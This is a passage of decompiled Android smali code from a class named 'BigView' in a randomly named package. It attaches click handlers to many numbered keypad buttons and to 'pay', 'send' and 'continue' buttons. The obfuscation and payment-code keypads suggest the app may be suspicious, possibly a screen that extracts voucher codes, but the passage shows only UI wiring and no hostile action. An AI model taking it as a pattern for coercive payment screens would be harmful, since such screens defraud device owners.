    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$26;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v25

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 678
    const v61, 0x7f08006c

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v26

    check-cast v26, Landroid/widget/Button;

    .line 679
    .local v26, "button_p_9":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$27;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$27;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v26

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 685
    const v61, 0x7f08006d

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v17

    check-cast v17, Landroid/widget/Button;

    .line 686
    .local v17, "button_p_0":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$28;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$28;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v17

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 692
    const v61, 0x7f080068

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v28

    check-cast v28, Landroid/widget/Button;

    .line 693
    .local v28, "button_p_del":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$29;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$29;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v28

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 699
    const v61, 0x7f08006e

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v27

    check-cast v27, Landroid/widget/Button;

    .line 700
    .local v27, "button_p_clear":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$30;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$30;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v27

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 706
    const v61, 0x7f080036

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v6

    check-cast v6, Landroid/widget/Button;

    .line 707
    .local v6, "button_m_1":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$31;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$31;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v61

    invoke-virtual {v6, v0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 713
    const v61, 0x7f080037

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v7

    check-cast v7, Landroid/widget/Button;

    .line 714
    .local v7, "button_m_2":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$32;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$32;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v61

    invoke-virtual {v7, v0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 720
    const v61, 0x7f080038

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v8

    check-cast v8, Landroid/widget/Button;

    .line 721
    .local v8, "button_m_3":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$33;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$33;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v61

    invoke-virtual {v8, v0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 727
    const v61, 0x7f080039

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v9

    check-cast v9, Landroid/widget/Button;

    .line 728
    .local v9, "button_m_4":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$34;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$34;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v61

    invoke-virtual {v9, v0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 734
    const v61, 0x7f08003a

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v10

    check-cast v10, Landroid/widget/Button;

    .line 735
    .local v10, "button_m_5":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$35;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$35;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v61

    invoke-virtual {v10, v0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 741
    const v61, 0x7f08003c

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v11

    check-cast v11, Landroid/widget/Button;

    .line 742
    .local v11, "button_m_6":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$36;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$36;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v61

    invoke-virtual {v11, v0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 748
    const v61, 0x7f08003d

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v12

    check-cast v12, Landroid/widget/Button;

    .line 749
    .local v12, "button_m_7":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$37;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$37;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v61

    invoke-virtual {v12, v0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 755
    const v61, 0x7f08003e

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v13

    check-cast v13, Landroid/widget/Button;

    .line 756
    .local v13, "button_m_8":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$38;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$38;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v61

    invoke-virtual {v13, v0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 762
    const v61, 0x7f08003f

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v14

    check-cast v14, Landroid/widget/Button;

    .line 763
    .local v14, "button_m_9":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$39;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$39;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v61

    invoke-virtual {v14, v0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 769
    const v61, 0x7f080040

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v5

    check-cast v5, Landroid/widget/Button;

    .line 770
    .local v5, "button_m_0":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$40;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$40;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v61

    invoke-virtual {v5, v0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 776
    const v61, 0x7f08003b

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v16

    check-cast v16, Landroid/widget/Button;

    .line 777
    .local v16, "button_m_del":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$41;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$41;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v16

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 783
    const v61, 0x7f080041

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v15

    check-cast v15, Landroid/widget/Button;

    .line 784
    .local v15, "button_m_clear":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$42;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$42;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v61

    invoke-virtual {v15, v0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 793
    const v61, 0x7f080013

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v30

    check-cast v30, Landroid/widget/Button;

    .line 794
    .local v30, "button_v_1":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$43;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$43;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v30

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 800
    const v61, 0x7f080014

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v31

    check-cast v31, Landroid/widget/Button;

    .line 801
    .local v31, "button_v_2":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$44;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$44;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v31

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 807
    const v61, 0x7f080015

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v32

    check-cast v32, Landroid/widget/Button;

    .line 808
    .local v32, "button_v_3":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$45;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$45;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v32

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 814
    const v61, 0x7f080016

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v33

    check-cast v33, Landroid/widget/Button;

    .line 815
    .local v33, "button_v_4":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$46;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$46;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v33

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 821
    const v61, 0x7f080017

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v34

    check-cast v34, Landroid/widget/Button;

    .line 822
    .local v34, "button_v_5":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$47;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$47;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v34

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 828
    const v61, 0x7f080019

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v35

    check-cast v35, Landroid/widget/Button;

    .line 829
    .local v35, "button_v_6":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$48;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$48;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v35

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 835
    const v61, 0x7f08001a

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v36

    check-cast v36, Landroid/widget/Button;

    .line 836
    .local v36, "button_v_7":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$49;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$49;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v36

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 842
    const v61, 0x7f08001b

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v37

    check-cast v37, Landroid/widget/Button;

    .line 843
    .local v37, "button_v_8":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$50;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$50;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v37

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 849
    const v61, 0x7f08001c

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v38

    check-cast v38, Landroid/widget/Button;

    .line 850
    .local v38, "button_v_9":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$51;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$51;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v38

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 856
    const v61, 0x7f08001d

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v29

    check-cast v29, Landroid/widget/Button;

    .line 857
    .local v29, "button_v_0":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$52;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$52;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v29

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 863
    const v61, 0x7f080018

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v40

    check-cast v40, Landroid/widget/Button;

    .line 864
    .local v40, "button_v_del":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$53;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$53;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v40

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 870
    const v61, 0x7f08001e

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v39

    check-cast v39, Landroid/widget/Button;

    .line 871
    .local v39, "button_v_clear":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$54;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$54;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v39

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 877
    const v61, 0x7f080057

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v57

    check-cast v57, Landroid/widget/Button;

    .line 878
    .local v57, "buttonsend1":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$55;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$55;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v57

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 884
    const v61, 0x7f080060

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v58

    check-cast v58, Landroid/widget/Button;

    .line 885
    .local v58, "buttonsend2":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$56;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$56;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v58

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 893
    const v61, 0x7f080025

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v3

    check-cast v3, Landroid/widget/TextView;

    .line 894
    .local v3, "bshowshops":Landroid/widget/TextView;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$57;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$57;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v61

    invoke-virtual {v3, v0}, Landroid/widget/TextView;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 917
    const v61, 0x7f080049

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v59

    check-cast v59, Landroid/widget/Button;

    .line 918
    .local v59, "continue2":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$58;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$58;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    move-object/from16 v0, v59

    move-object/from16 v1, v61

    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 940
    const v61, 0x7f08004b

    move-object/from16 v0, p0

    move/from16 v1, v61

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v60

    check-cast v60, Landroid/widget/Button;

    .line 941
    .local v60, "continue3":Landroid/widget/Button;
    new-instance v61, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$59;

    move-object/from16 v0, v61

    move-object/from16 v1, p0

    invoke-direct {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView$59;-><init>(Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;)V

    invoke-virtual/range {v60 .. v61}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 962
    return-void

    .line 490
    .end local v3    # "bshowshops":Landroid/widget/TextView;
    .end local v4    # "buttonART":Landroid/widget/LinearLayout;
    .end local v5    # "button_m_0":Landroid/widget/Button;
    .end local v6    # "button_m_1":Landroid/widget/Button;
    .end local v7    # "button_m_2":Landroid/widget/Button;
    .end local v8    # "button_m_3":Landroid/widget/Button;
    .end local v9    # "button_m_4":Landroid/widget/Button;
    .end local v10    # "button_m_5":Landroid/widget/Button;
    .end local v11    # "button_m_6":Landroid/widget/Button;
    .end local v12    # "button_m_7":Landroid/widget/Button;
    .end local v13    # "button_m_8":Landroid/widget/Button;
    .end local v14    # "button_m_9":Landroid/widget/Button;
    .end local v15    # "button_m_clear":Landroid/widget/Button;
    .end local v16    # "button_m_del":Landroid/widget/Button;
    .end local v17    # "button_p_0":Landroid/widget/Button;
    .end local v18    # "button_p_1":Landroid/widget/Button;
    .end local v19    # "button_p_2":Landroid/widget/Button;
    .end local v20    # "button_p_3":Landroid/widget/Button;
    .end local v21    # "button_p_4":Landroid/widget/Button;
    .end local v22    # "button_p_5":Landroid/widget/Button;
    .end local v23    # "button_p_6":Landroid/widget/Button;
    .end local v24    # "button_p_7":Landroid/widget/Button;
    .end local v25    # "button_p_8":Landroid/widget/Button;
    .end local v26    # "button_p_9":Landroid/widget/Button;
    .end local v27    # "button_p_clear":Landroid/widget/Button;
    .end local v28    # "button_p_del":Landroid/widget/Button;
    .end local v29    # "button_v_0":Landroid/widget/Button;
    .end local v30    # "button_v_1":Landroid/widget/Button;
    .end local v31    # "button_v_2":Landroid/widget/Button;
    .end local v32    # "button_v_3":Landroid/widget/Button;
    .end local v33    # "button_v_4":Landroid/widget/Button;
    .end local v34    # "button_v_5":Landroid/widget/Button;
    .end local v35    # "button_v_6":Landroid/widget/Button;
    .end local v36    # "button_v_7":Landroid/widget/Button;
    .end local v37    # "button_v_8":Landroid/widget/Button;
    .end local v38    # "button_v_9":Landroid/widget/Button;
    .end local v39    # "button_v_clear":Landroid/widget/Button;
    .end local v40    # "button_v_del":Landroid/widget/Button;
    .end local v41    # "button_\u00f1_0":Landroid/widget/Button;
    .end local v42    # "button_\u00f1_1":Landroid/widget/Button;
    .end local v43    # "button_\u00f1_2":Landroid/widget/Button;
    .end local v44    # "button_\u00f1_3":Landroid/widget/Button;
    .end local v45    # "button_\u00f1_4":Landroid/widget/Button;
    .end local v46    # "button_\u00f1_5":Landroid/widget/Button;
    .end local v47    # "button_\u00f1_6":Landroid/widget/Button;
    .end local v48    # "button_\u00f1_7":Landroid/widget/Button;
    .end local v49    # "button_\u00f1_8":Landroid/widget/Button;
    .end local v50    # "button_\u00f1_9":Landroid/widget/Button;
    .end local v51    # "button_\u00f1_clear":Landroid/widget/Button;
    .end local v52    # "button_\u00f1_del":Landroid/widget/Button;
    .end local v53    # "buttondata":Landroid/widget/LinearLayout;
    .end local v55    # "buttoninfo":Landroid/widget/LinearLayout;
    .end local v56    # "buttonpay":Landroid/widget/LinearLayout;
    .end local v57    # "buttonsend1":Landroid/widget/Button;
    .end local v58    # "buttonsend2":Landroid/widget/Button;
